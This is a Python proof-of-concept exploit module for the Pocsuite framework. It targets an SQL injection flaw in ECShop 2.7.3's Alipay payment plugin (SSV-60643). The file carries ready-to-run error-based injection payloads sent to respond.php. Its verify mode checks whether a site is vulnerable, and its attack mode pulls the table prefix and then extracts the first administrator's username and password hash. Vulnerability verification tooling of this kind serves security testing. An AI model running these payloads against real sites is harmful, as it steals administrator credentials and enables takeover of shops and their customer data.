#!/usr/bin/env python
# coding: utf-8
import re
import urllib

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = 'SSV-60643'
    version = '1'
    author = '0x153'
    vulDate = '2013-02-22'
    createDate = '2015-10-15'
    updateDate = '2015-10-15'
    references = ['http://www.sebug.net/vuldb/ssvid-60643','http://www.tuicool.com/articles/vauaMz','http://www.waitalone.cn/ecshop-alipay-plug-injected-exp.html']
    name = 'ECShop支持宝插件SQL注入漏洞'
    appPowerLink = 'www.ecshop.com'
    appName = 'ECShop'
    appVersion = '2.7.3'
    vulType = 'SQL Injection'
    desc = '''
       ECShop支持宝插件SQL注入漏洞
    '''

    samples = ['']

    '''
    获取标准url
    @param url 需要转化的url
    '''
    def get_standard_url(self,data,url):
        if url.count("http") != 0:
          if url[-1] == '/':  #http://www.xxoo.com/
            url = "%s%s" % (url,urllib.quote(data,"?@`[]*,+()/'&=!_%"))
          else:   #http://www.xxoo.com
            url = "%s/%s" % (url,urllib.quote(data,"?@`[]*,+()/'&=!_%"))
        else: 
          if url[-1] ==  '/':  #www.xxoo.com/club/
            url = "http://%s%s" % (url,urllib.quote(data,"?@`[]*,+()/'&=!_%"))
          else:   #www.xxoo.com/club
            url = "http://%s/%s" % (url,urllib.quote(data,"?@`[]*,+()/'&=!_%"))
        return url

    '''
    获取表前缀
    @param url 目标主机的url
    '''
    def get_table_pre(self,url):
        data = "respond.php?code=alipay&subject=0&out_trade_no=%00' union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(table_name) from information_schema.tables where table_schema=database() limit 1))a from information_schema.tables group by a)b%23"
        url = self.get_standard_url(data,url)
 
        pattern = re.compile(r"Duplicate entry '[0,1]?(.+?)[0,1]?'")

        '''
        使用这种注入方式存在一定不确定性，需要多循环几次
        '''
        for i in range(10): 
            r = req.get(url)
            ret = pattern.findall(r.content)
            if ret:
                if ret[0].count('ecs') != 0:
                    return 'ecs'
                else:
                    return ret[0][0:ret[0].index('_')]  
        return None

    '''
    注入攻击代码
    @param url 目标主机的url
    @param count 爆数据的参数，default=0
    @param table_pre 数据库表前缀
    '''
    def _attack(self):
        try:
            result ={}
            #获取表前缀
            table_pre = self.get_table_pre(self.url)
            if table_pre is None:
                return self.parse_attack(result)
            #获取url
            data = "respond.php?code=alipay&subject=0&out_trade_no=%00' union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(CHAR(126),CHAR(126),CHAR(126),user_name,CHAR(124),CHAR(124),CHAR(124),password,CHAR(126),CHAR(126),CHAR(126)) from {table_pre}_admin_user limit 1))a from information_schema.tables group by a)b%23".format(table_pre=table_pre)
            url = self.get_standard_url(data,self.url)

            pattern = re.compile(r"~~~(\w+?)\|\|\|(\w+?)~~~")

            for i in range(10):
                r = req.get(url)
                re_result = pattern.findall(r.content.decode(r.encoding))
                if re_result:
                    result['AdminInfo'] = {}
                    result['AdminInfo']['Username'] = re_result[0][0]
                    result['AdminInfo']['Password'] = re_result[0][1]
                    return self.parse_attack(result)
            return self.parse_attack(result)
        except:
            import traceback
            traceback.print_exc()

    def _verify(self, verify=True):
        try:
            result = {}
            payload = "/respond.php?code=alipay&subject=0&out_trade_no=%00' union select 1 from (select count(*),concat(floor(rand()*2),(select md5(123456)))a from information_schema.tables group by a)b%23"
            vulurl = self.url + payload

            '''
            本地测试的时候，存在不稳定的情况，
            可能是MySQL的bug，使用循环减少误报
            '''
            for i in range(10): 
                respond = req.get(vulurl)
                if 'e10adc3949ba59abbe56e057f20f883e' in respond.content:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = vulurl
                    return self.parse_attack(result)
            return self.parse_attack(result)
        except:
            import traceback
            traceback.print_exc()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)